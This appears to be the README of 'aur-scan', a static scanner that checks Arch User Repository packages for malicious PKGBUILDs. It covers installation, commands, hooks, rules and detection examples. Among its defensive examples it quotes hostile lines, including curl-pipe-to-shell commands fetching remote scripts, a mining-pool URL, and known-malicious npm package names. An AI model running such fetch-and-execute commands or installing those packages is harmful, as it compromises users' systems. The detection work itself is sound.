## Why This Exists

The Arch User Repository (AUR) is an incredible community resource that extends Arch Linux with thousands of user-contributed packages. However, AUR packages are inherently untrusted and have been exploited multiple times:

| Date | Attack | Impact |
|------|--------|--------|
| **June 2026** | "Atomic Arch" — 1,500+ orphaned packages adopted and modified to pull malicious npm/bun packages (`atomic-lockfile`, `js-digest`, `lockfile-js`) | Credential stealer + eBPF rootkit (`scales.bpf.c`) dropped from install hooks |
| **Jul/Aug 2026** | "Atomic Arch Wave 3" — two-stage C loader (`sudo "$srcdir/optimizer"` in `build()`) + Rust stealer/RAT/SSH-worm via Tor `.onion` C2 | Credential/crypto/browser harvest, Tor exfil, SSH lateral movement; forced AUR push lockdown (2026-08-01) |
| **July 2025** | CHAOS RAT distributed via `firefox-patch-bin` and `librewolf-fix-bin` | Remote access trojan with persistence via systemd masquerading |
| **2018** | Orphaned packages `acroread`, `balz`, `minergate` hijacked | Cryptominer installation via `curl | bash` and systemd timers |
| **Ongoing** | Typosquatting attacks mimicking popular package names | Various malware payloads |

**There was no automated tool to scan for these threats before installation. Now there is.**

This scanner implements detection rules based on real-world attacks and security research, providing an additional layer of defense for the Arch Linux ecosystem.

## Installation

### From AUR

All four packages install the same `aur-scan` binary and **conflict with each
other — install exactly one**. Pick the channel that fits you:

| Package | Channel | Builds from | Best for |
|---------|---------|-------------|----------|
| [`aur-scanner`](https://aur.archlinux.org/packages/aur-scanner) | **Stable** (recommended) | GPG-signed release tag | Most users and production systems |
| [`ks-aur-scanner`](https://aur.archlinux.org/packages/ks-aur-scanner) | Stable (alias) | GPG-signed release tag | Same as `aur-scanner`, under an alternate name |
| [`aur-scanner-rc`](https://aur.archlinux.org/packages/aur-scanner-rc) | Release candidate | GPG-signed pre-release tag | Testing the next release before it ships |
| [`aur-scanner-git`](https://aur.archlinux.org/packages/aur-scanner-git) | Rolling | Latest commit on `main` | Bleeding edge and contributors |

```bash
paru -S aur-scanner        # stable, recommended — or: yay -S aur-scanner
```

The tagged packages (`aur-scanner`, `ks-aur-scanner`, `aur-scanner-rc`) build
from a **GPG-signed git tag** and verify it against our signing key
(`validpgpkeys`), so `makepkg` refuses to build a tag that isn't signed by us —
integrity comes from the signature, not a tarball hash. If your AUR helper does
not fetch the key automatically, import it once:

```bash
gpg --recv-keys 25631EAE3F43999050B7D7021132BF893C33FB51
```

> **Release-candidate channel — [`aur-scanner-rc`](https://aur.archlinux.org/packages/aur-scanner-rc):**
> tracks the next release before it is promoted to stable, so you can test changes
> early; when there is no pending candidate it follows the current stable. The RC
> **fails closed** (the wrapper/hook deny on a scan error, timeout, or no-TTY
> prompt rather than proceeding). Most users — and all production systems — should
> install the stable `aur-scanner`.

### From Source

```bash
git clone https://github.com/KiefStudioMA/ks-aur-scanner.git
cd ks-aur-scanner
cargo build --release
```

### Manual Installation

After building from source:

```bash
# Install binaries
sudo install -Dm755 target/release/aur-scan /usr/bin/aur-scan
sudo install -Dm755 target/release/aur-scan-wrap /usr/bin/aur-scan-wrap
sudo install -Dm755 target/release/aur-scan-hook /usr/bin/aur-scan-hook

# Install shell integration (recommended — scans BEFORE makepkg builds)
sudo install -Dm644 install/integration.bash /usr/share/aur-scan/integration.bash
sudo install -Dm644 install/integration.zsh /usr/share/aur-scan/integration.zsh
sudo install -Dm644 install/integration.fish /usr/share/aur-scan/integration.fish
sudo install -Dm644 install/integration.nu /usr/share/aur-scan/integration.nu

# Install the community rules example
sudo install -Dm644 install/rules.d/example.toml /usr/share/aur-scanner/rules.d/example.toml

# Pacman hook — opt-in backstop only. It runs AFTER makepkg has already built
# (and executed) the package, so it catches .install scriptlets, not build-time
# payloads. Prefer the shell integration above. Enable it deliberately:
sudo install -Dm644 install/aur-scan.hook /usr/share/libalpm/hooks/aur-scan.hook
```

## Command Reference

### aur-scan check

Resolve the **full AUR dependency tree**, scan every untrusted package in it,
and emit a reviewable **SBOM** — all *before* anything is built or installed.
`paru -S foo` builds foo's entire AUR dependency closure, and a hijacked
package is often a *dependency*, so the named package alone is not enough.

```bash
aur-scan check <package-name>... [OPTIONS]

OPTIONS:
    --no-deps            Scan only the named packages, not their AUR dep tree
    --include-optional   Also follow optdepends when resolving the tree
    --sbom <FILE>        Write a CycloneDX 1.5 SBOM of the whole tree to FILE
    --local <DIR>        Scan an already-fetched package dir from disk (repeatable)
    --fail-on <LEVEL>    Exit non-zero if findings at this level or above
                         (critical, high, medium, low, info)
    --no-confirm         Don't prompt; just report (for wrappers/CI)
```

**Race-free (TOCTOU-safe) workflow.** By default `check` fetches its own copy of
each PKGBUILD; the helper then re-clones and builds its own copy, so the bytes
scanned aren't provably the bytes built. To scan the *exact* bytes that will be
built, fetch once and scan that directory with `--local`, then build from it:

```bash
paru -G mypkg                          # download PKGBUILD only, no build
aur-scan check --local mypkg --fail-on critical   # scan those exact bytes
makepkg -D mypkg -si                   # build the same, reviewed directory
```

`--local` directories are scanned from disk and marked `(local)`; any remaining
AUR dependencies are resolved/fetched normally (provide their dirs too for a
fully race-free tree).

The dependency tree is printed for review, marking each node `[AUR]` (scanned)
or `[repo]` (official, trusted), flagging orphaned AUR packages, and annotating
findings per node (`!! 2C/1H`). AUR packages are resolved recursively; official
repository dependencies are signed and treated as trusted leaves.

**Examples:**

```bash
# Resolve + scan the full tree and review it before installing
aur-scan check librewolf-bin

# Produce a CycloneDX SBOM to archive or review
aur-scan check ungoogled-chromium-bin --sbom chromium.cdx.json

# CI gate: fail on any high+ finding anywhere in the tree
aur-scan check my-package --no-confirm --fail-on high

# Just the named package, skip the dependency closure
aur-scan check some-tool --no-deps
```

> The dependency tree and SBOM are produced from the AUR RPC + PKGBUILDs
> **before** `makepkg` runs, which is the only point at which AUR build-time
> payloads can be caught. Drive it automatically by sourcing the shell
> integration so `paru`/`yay` call `aur-scan check` before every install.

### aur-scan install (race-free)

Resolve the tree, fetch every AUR package **once** into a workspace, scan those
exact directories, and — only if the scan gate passes — build them in
dependency order with `makepkg`, **from the same directories that were
scanned**. This eliminates the time-of-check/time-of-use gap entirely: there is
no second fetch between scanning and building.

```bash
aur-scan install <package>... [OPTIONS]

OPTIONS:
    --gate <LEVEL>       Findings at/above this severity block the build
                         [default: critical]
    --force              Build even if the gate trips (deliberate override)
    --noconfirm          Pass --noconfirm to makepkg, skip the build prompt
    --workspace <DIR>    Clone/build workspace (default ~/.cache/aur-scan/build)
    --sbom <FILE>        Write a CycloneDX SBOM of the tree
```

Dependency ordering comes from the resolved graph (deps built before
dependents); `makepkg` itself does all the building, so no PKGBUILD logic is
reimplemented. Enable it as the default for the shell integration with
`export AUR_SCAN_MODE=install`. It targets AUR packages; install official-repo
packages with `pacman` as usual.

> **Scope:** builds each AUR `pkgbase` with `makepkg -si` in dependency order.
> It does not (yet) cover paru-specific features like split-package selection or
> chroot builds; for those, use the Level 2 `gate` mode.

### aur-scan scan

Scan a local PKGBUILD file or directory.

```bash
aur-scan scan <PATH> [OPTIONS]

OPTIONS:
    --format <FORMAT>    Output format: text, json, sarif [default: text] (-f)
    --output <FILE>      Write output to a file instead of stdout (-o)
    --fail-on <LEVEL>    Exit with error if findings at this level or above
    --include-info       Include informational (Info-level) findings

ARGUMENTS:
    <PATH>               Path to PKGBUILD file or directory containing PKGBUILD
```

**Examples:**

```bash
# Scan a single PKGBUILD
aur-scan scan ./PKGBUILD

# Scan a package directory (looks for PKGBUILD and .install files)
aur-scan scan ~/builds/my-package/

# Output SARIF for GitHub Security tab integration
aur-scan scan ./PKGBUILD --format sarif > results.sarif
```

### aur-scan system

Audit all AUR packages currently installed on the system.

```bash
aur-scan system [OPTIONS]

OPTIONS:
    --rescan             Re-fetch PKGBUILDs from the AUR instead of using the local cache
    --cache-dir <DIR>    Custom cache directory for PKGBUILDs
```

This command:
1. Queries pacman for foreign (non-repo) packages
2. Locates cached PKGBUILDs in AUR helper cache directories
3. Scans each package and reports findings

**Supported cache locations** (per-helper defaults; XDG `*_HOME` overrides are honored):
- `~/.cache/yay/` (yay)
- `~/.cache/paru/clone/` (paru)
- `~/.local/share/pikaur/aur_repos/` (pikaur)
- `~/.cache/aura/packages/` (aura)
- `~/.cache/pakku/` (pakku)
- `~/.cache/trizen/sources/` (trizen)
- `~/.cache/aurutils/sync/` (aurutils)
- `~/.config/rua/pkg/` (rua)
- `~/.cache/pat-aur/pkgbuild/aur/` (pat-aur)

`system` also cross-references your installed package names against the IOC
database (see below) and runs the provenance check (flagging any package that
*gained* risky behavior since the last scan).

### aur-scan ioc

Show or query the local IOC (indicator-of-compromise) database — known-malicious
payload packages, file artifacts, C2 domains, payload hashes, C2 static public
keys, and campaign metadata. The database is embedded and can be extended from
a feed (drop a file at `/usr/share/aur-scanner/ioc.toml` or
`~/.local/share/aur-scanner/ioc.toml`).

```bash
aur-scan ioc                 # show database stats + campaigns
aur-scan ioc --check <name>  # is this package/file/hash a known indicator?
```

### aur-scan codes

List all detection codes with their severity and description.

```bash
aur-scan codes [OPTIONS]

OPTIONS:
    --category <CAT>     Filter by category
    --format <FORMAT>    Output format: text, markdown, json (default: text)
```

**Example output** (grouped by category):

```
[Command Injection]
  DLE-001 [Critical] Curl pipe to shell
  DLE-002 [Critical] Wget pipe to shell
  DLE-003 [Critical] Curl output executed
...
```

### aur-scan explain

Get detailed information about a specific detection code.

```bash
aur-scan explain <CODE>
```

**Example:**

```bash
$ aur-scan explain DLE-001

DLE-001: Curl pipe to shell
===========================

Severity: CRITICAL
Category: Command Injection
CWE: CWE-94

Description:
  Downloading and executing remote scripts is extremely dangerous.
  Used in 2018 xeactor attack.

Recommendation:
  Download scripts first, review them, then execute

Example Pattern:
  curl https://malicious.com/script.sh | bash
```

---

## Integration Options

### Level 1: Manual CLI

Use `aur-scan` commands directly before installing packages. This provides full control but requires manual invocation.

```bash
# Check package first
aur-scan check some-package

# Review output, then install if safe
paru -S some-package
```

### Level 2: Shell Integration (Recommended)

Add automatic scanning to your shell by sourcing the integration script.

**For Bash** - Add to `~/.bashrc`:

```bash
source /usr/share/aur-scan/integration.bash
```

**For Zsh** - Add to `~/.zshrc`:

```bash
source /usr/share/aur-scan/integration.zsh
```

**For Fish** - Add to `~/.config/fish/config.fish`:

```fish
source /usr/share/aur-scan/integration.fish
```

**For Nushell** - Add to your `config.nu`:

```nu
source /usr/share/aur-scan/integration.nu
```

The bash/zsh/fish scripts classify the helper invocation in-shell; the Nushell
script routes installs through the `aur-scan-wrap` binary (same scan-then-handoff
gate), so it requires `aur-scan-wrap` on `PATH` (shipped with every package).

This creates wrapper functions for `paru` and `yay` that:
1. Detect AUR package installations
2. Pre-scan packages before proceeding
3. Prompt for confirmation on findings
4. Provide `paru-unsafe` and `yay-unsafe` aliases to bypass scanning

**Example workflow:**

```bash
$ paru -S some-aur-package
AUR Security Scanner: Pre-checking packages...
============================================================
Checking: some-aur-package... OK
============================================================
Proceeding with installation...
```

### Level 3: Wrapper Binary

Use the standalone wrapper binary for explicit control:

```bash
# Direct usage
aur-scan-wrap paru -S package-name

# Or set up as an alias
alias paru='aur-scan-wrap paru'
alias yay='aur-scan-wrap yay'
```

The wrapper:
- Detects sync operations (`-S`, `--sync`)
- Filters to only AUR packages (skips official repo packages)
- Scans each AUR package before proceeding
- Prompts on critical/high findings
- Passes through non-install operations unchanged

### Level 4: Pacman Hook (backstop only — runs *after* the build)

> **Important timing caveat.** For an AUR package, `makepkg` runs the
> PKGBUILD's `prepare()`/`build()`/`package()` **before** the pacman
> transaction. A libalpm `PreTransaction` hook fires during that transaction —
> i.e. *after* the build has already executed. So this hook **cannot stop a
> build-time payload** (the most common AUR attack, including Atomic Arch) — by
> the time it fires, that code has already run. It still scans the full PKGBUILD,
> but it can only *prevent* payloads that haven't executed yet, in practice the
> package's `.install` scriptlet. **Use the shell integration (Level 2) as your
> real gate; treat this hook as a backstop.**

For a defense-in-depth backstop, install the pacman hook:

```bash
sudo cp /usr/share/aur-scan/aur-scan.hook.example /usr/share/libalpm/hooks/aur-scan.hook
```

**Hook behavior:**
- Triggers before the *install transaction* (after the build)
- **Aborts the transaction on CRITICAL findings** (anywhere in the scanned PKGBUILD or its resolved `.install` scriptlet), and aborts fail-closed if a located PKGBUILD cannot be analyzed
- Warns on HIGH severity findings

**Hook configuration** (`/usr/share/libalpm/hooks/aur-scan.hook`):

```ini
[Trigger]
Operation = Install
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Scanning AUR packages for security issues...
When = PreTransaction
Exec = /usr/bin/aur-scan-hook
AbortOnFail
NeedsTargets
```

## Custom & Community Rules

Every detection code lives in one authoritative **catalog**, so the index is
unique and auditable — run `aur-scan codes` to see it, or
`aur-scan explain <ID>` for any code. You can extend it with a few lines of
TOML; no rebuild required.

Drop `.toml` files into any of:

| Path | Scope |
|------|-------|
| `/usr/share/aur-scanner/rules.d/` | distro / package-shipped |
| `/etc/aur-scanner/rules.d/` | system administrator |
| `~/.config/aur-scanner/rules.d/` | per user |

```toml
[[rule]]
id = "ACME-001"                 # must be UNIQUE across the whole catalog
name = "Flags the ACME backdoor marker"
description = "Detects the marker string left by the ACME backdoor."
severity = "critical"           # critical | high | medium | low | info
category = "malicious_code"
recommendation = "Do not build; report the package."
file_types = ["pkgbuild", "install_script"]

[[rule.patterns]]
type = "regex"
pattern = "acme_backdoor_[0-9a-f]{8}"
```

The loader skips malformed files with a warning (it never breaks the engine),
and `aur-scan codes` surfaces a loud warning if any ID collides. A shipped example lives at
`/usr/share/aur-scanner/rules.d/example.toml`. Use an org-specific prefix to
avoid collisions.

## Output Formats

### Text (Default)

Human-readable output with colored severity indicators:

```bash
aur-scan scan ./PKGBUILD
```

### JSON

Machine-readable JSON for scripting and automation:

```bash
aur-scan scan ./PKGBUILD --format json
```

**Example output:**

```json
{
  "package_name": "example-package",
  "package_version": "1.0.1-1",
  "scan_duration_ms": 45,
  "findings": [
    {
      "id": "DLE-001",
      "severity": "critical",
      "category": "command_injection",

---

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `AUR_SCAN_ENABLED` | `1` | Enable/disable scanning in shell integration |
| `AUR_SCAN_SEVERITY` | `high` | Minimum severity to display |
| `AUR_SCAN_INTERACTIVE` | `1` | Prompt before proceeding |
| `AUR_SCAN_SCAN_UPGRADES` | `1` | On a system upgrade (`-Syu`/`-Syyu`/bare `yay`), scan **each** AUR package that has a pending update (resolved via the helper's `-Quaq`). A hijacked *update* is the primary AUR threat, so this is on by default; set `0` to skip it. |
| `AUR_SCAN_SCAN_GETPKGBUILD` | `0` | Also scan the package(s) on `-G`/`--getpkgbuild` (which only downloads a PKGBUILD to review). Off by default; set `1` to opt in. |

The shell integration scans what's **named** on the command line — `-S pkg`, a bare `helper pkg`, `yay -Y pkg`, and (above) the upgrade set. It cannot see the package chosen *after* an interactive search-and-select menu (`yay`'s default `-Y` mode resolves it at runtime); for that — and for any helper or path the shell functions don't wrap — enable the opt-in **pacman hook**, which fires on the exact package set of every transaction. `paru`, `yay`, `pikaur`, `trizen`, and `pakku` are wrapped as shell functions (they share pacman's `-S`/`-Syu` grammar); `aura` (installs via `-A`) and the subcommand-grammar tools (`aurutils`, `rua`, `pat-aur`) are covered by the pacman hook instead, which fires on every transaction regardless of helper.

**Color output** is on when writing to a terminal and automatically off when piped or redirected. Force it off with the global `--no-color` flag or by setting `NO_COLOR=1`.

### Configuration File

Optional configuration file at `/etc/aur-scanner/config.toml`:

```toml
# Minimum severity to report
min_severity = "low"

# Scan timeout in seconds
timeout_seconds = 30

# Opt-in threat intelligence — OFF by default (see "Threat Intelligence" below)
enable_threat_intel = false

[threat_intel]
# VirusTotal API key (or env VT_API_KEY / VIRUSTOTAL_API_KEY)
# virustotal_api_key = "..."
urlhaus_enabled = false
# URLhaus Auth-Key — now mandatory at abuse.ch (or env URLHAUS_AUTH_KEY)
# urlhaus_auth_key = "..."
cache_duration_hours = 24

# Cache settings
[cache]
enabled = true
directory = "/var/cache/aur-scanner"
max_size_mb = 100
ttl_hours = 24
```

### Threat Intelligence (opt-in)

By default aur-scan is fully offline and static. You can optionally cross-check a
package against external reputation services — it is **off unless you turn it on**,
and only data already public in the PKGBUILD is ever sent.

Enable it with `enable_threat_intel = true` and supply at least one provider key:

- **VirusTotal** — `virustotal_api_key` in config, or `VT_API_KEY` /
  `VIRUSTOTAL_API_KEY` in the environment. Checks each declared `sha256sums`
  entry and emits `TI-VT-001` when engines flag the hash.
- **URLhaus** — set `urlhaus_enabled = true` and supply `urlhaus_auth_key` (or
  `URLHAUS_AUTH_KEY`); abuse.ch now requires a free Auth-Key from
  <https://auth.abuse.ch/>. Checks each `source=` URL and emits `TI-URLHAUS-001`.

Guarantees:

- **Off by default, bring-your-own-key** — no key, no lookups, no egress.
- **Least disclosure** — only public source hashes and URLs leave your machine;
  never file contents or anything about you.
- **Fail-open** — a provider error, quota limit, or outage never fails or blocks
  a scan.
- **Auditable egress** — every external call lives in one file
  (`crates/aur-scanner-core/src/threat_intel/remote.rs`): HTTPS-only,
  no-redirect, time-bounded.
- **Cached & capped** — verdicts are cached (authenticated `DiskCache`) and
  lookups are bounded per scan to respect VirusTotal's 4-request/minute public
  API quota.

## Real-World Detection Examples

### Atomic Arch Supply-Chain Attack (June 2026)

Orphaned packages were adopted and their install hooks modified to pull a
malicious npm/bun package that drops an infostealer and eBPF rootkit. The
scanner flags both the install-hook behavior and the known-bad package names:

```
[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook
    Location: alvr.install:4
    npm install atomic-lockfile

[CRITICAL] ATOMIC-001 Atomic Arch malicious npm/bun package
    Location: alvr.install:4
    Known-malicious package: atomic-lockfile

[CRITICAL] ATOMIC-001 Atomic Arch malicious npm/bun package
    Location: alvr.install:9
    Known-malicious package: js-digest (wave 2, Bun installer)
```

### CHAOS RAT Attack (July 2025)

The scanner would have detected this attack with the following findings:

```
[CRITICAL] PERSIST-006 Systemd masquerading
    Location: PKGBUILD:45
    Binary named like systemd component: 'systemd-initd'

[CRITICAL] INSTALL-001 Python execution in install script
    Location: librewolf-fix-bin.install:12
    Executing Python in post_install is suspicious

[CRITICAL] PERSIST-001 Systemd service creation
    Location: librewolf-fix-bin.install:15
    systemctl enable firefox-fix.service

[HIGH] HIDDEN-002 Tmp directory execution
    Location: PKGBUILD:23
    /tmp/systemd-initd
```

### 2018 Cryptominer Attack (xeactor)

```
[CRITICAL] DLE-001 Curl pipe to shell
    Location: PKGBUILD:18
    curl -s https://ptpb.pw/~x | bash

[CRITICAL] PASTE-001 Pastebin download
    Location: PKGBUILD:18
    Downloads from paste sites (ptpb.pw)

[CRITICAL] PERSIST-002 Systemd timer creation
    Location: PKGBUILD:34
    OnBootSec=1min

[CRITICAL] CRYPTO-001 Mining pool connection
    Location: hidden-script.sh:5
    stratum+tcp://pool.supportxmr.com:3333
```

## Contributing

This is a security tool a lot of people now rely on, and it shouldn't depend on
one person. **Contributors are genuinely welcome** — the whole point of the
auditable [detection catalog](#detection-rules-reference) and the community
[`rules.d/`](#custom--community-rules) format is so anyone can extend it without
touching the core.

Good places to start (look for [`good first issue`](https://github.com/KiefStudioMA/ks-aur-scanner/labels/good%20first%20issue)):

- **Detection rules** — patterns for emerging threats, as a community TOML rule or a built-in
- **False-positive fixes** — tighten a pattern that cries wolf (like the `chmod 755` one we fixed in 1.0.2)
- **AUR-helper integrations** — more shells/helpers (fish was added by a contributor in 1.0.3)
- **Docs, tests, fixtures**

**Read [CONTRIBUTING.md](CONTRIBUTING.md) first** — it spells out the bar. The
short version, because this is a security tool and the bar does not move:

- **Static-only is a hard invariant.** The scanner must *never* execute, source, or fetch-and-run a package it inspects. PRs that breach this are rejected on principle.
- **Every detection code lives in the auditable catalog** and is covered by the uniqueness/coverage tests — no orphan rules.
- **Tests + `cargo clippy` (no warnings) + `cargo fmt` are required.** New behavior needs new tests.
- **No change may weaken an existing security check** to make something simpler or faster.
- **`main` requires signed, reviewed commits** (enforced by a branch ruleset). Every change is reviewed before it lands; merges are GPG-signed. See CONTRIBUTING.md for how that works with your fork.

---

## Security

See **[SECURITY.md](SECURITY.md)** for the full policy and threat model.

### Reporting vulnerabilities

Report privately — **do not** open a public issue:

- **Email:** security@kief.studio (or use GitHub's *Report a vulnerability* button)

### How this project protects itself

A security tool has to be trustworthy end-to-end, so the supply chain around it
is hardened too:

- **The scanner is static-only** — it reads PKGBUILDs and install scripts; it never executes, sources, or fetches-and-runs the package it inspects. The scan cannot compromise the machine doing the scanning.
- **Releases are GPG-signed.** Tags are signed, and the tagged AUR packages verify the signature (`validpgpkeys`) instead of trusting a tarball hash. Verify with `git verify-tag v<version>`.
- **`main` and release tags are protected** by a branch ruleset: signed commits required, no force-push, no deletion. Every change is reviewed.
- **One auditable catalog.** Every detection code is indexed and uniqueness-tested, so what the tool *can* flag is always reviewable (`aur-scan codes`).

### Limits (be honest about them)

- Static analysis cannot catch every novel or heavily-obfuscated attack
- Sandboxed dynamic analysis is out of scope by design (that's what keeps it safe to run)
- For critical systems, still review PKGBUILDs yourself — this is defense-in-depth, not a guarantee

## Credits

**Developed by [Kief Studio](https://kief.studio)**

This project was created to address a critical gap in the Arch Linux security ecosystem. Special thanks to the security researchers who documented the attacks that informed our detection rules.

### Contributors

Built by the community, not just us. Thank you:

- [**@Disklo** (Rafael Lucio)](https://github.com/Disklo) — fixed a false-negative in `aur-scan check` and added the fish shell integration ([#4](https://github.com/KiefStudioMA/ks-aur-scanner/pull/4), 1.0.3)
- [**@SuitablyMysterious**](https://github.com/SuitablyMysterious) — contributed the June 2026 "Atomic Arch" malware package list now in the IOC database ([#3](https://github.com/KiefStudioMA/ks-aur-scanner/pull/3)), and originated the idea of VirusTotal + abuse.ch/URLhaus threat-intelligence checks ([#9](https://github.com/KiefStudioMA/ks-aur-scanner/pull/9)). That feature ships reimplemented from scratch with fully isolated network egress, but the direction was theirs.

Some of the above were brought in by cherry-pick rather than the merge button — the work landed and the credit stands the same.

**Issue reports that shaped releases:**

- [**@LunarEclipse363**](https://github.com/LunarEclipse363) — [#2](https://github.com/KiefStudioMA/ks-aur-scanner/issues/2): detecting third-party package-manager calls in install hooks, which shaped the install-hook detection (`ATOMIC-002`)
- [**@zebulon2**](https://github.com/zebulon2) — [#10](https://github.com/KiefStudioMA/ks-aur-scanner/issues/10): reported the obfuscated `bun install` payload class the anti-evasion hardening targets
- [**@nikoraasu**](https://github.com/nikoraasu) — [#12](https://github.com/KiefStudioMA/ks-aur-scanner/issues/12): diagnosed that the shell wrapper only gated `-S`-style operations, shaping the operation classifier and broader AUR-helper coverage

## Disclaimer

This tool provides an additional layer of security but **does not guarantee complete protection**.

- Static analysis cannot detect all forms of malicious behavior
- Obfuscated or novel attack patterns may evade detection
- False positives may occur; always verify findings
- This tool supplements but does not replace manual PKGBUILD review

The AUR is an inherently trust-based system where users are expected to verify package contents before installation. This scanner is a defense-in-depth measure, not a security guarantee.

**Use at your own risk. The authors are not responsible for any damage caused by malicious packages, whether detected or not.**
